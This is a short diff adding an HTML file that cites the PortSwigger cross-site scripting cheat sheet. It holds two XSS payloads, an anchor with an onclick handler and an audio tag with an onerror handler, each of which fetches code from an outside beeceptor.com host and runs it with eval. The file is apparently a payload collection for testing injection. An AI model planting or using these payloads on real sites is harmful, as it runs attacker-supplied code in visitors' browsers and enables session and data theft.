@@ -1,0 +1,5 @@
+<!-- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet -->
+
+<a onclick="fetch('http://chacha.free.beeceptor.com').then(r=>r.text()).then(r=>eval(r))">A</a>
+
+<audio src/onerror="fetch('https://chacha.free.beeceptor.com').then(r=>r.text()).then(r=>eval(r))">
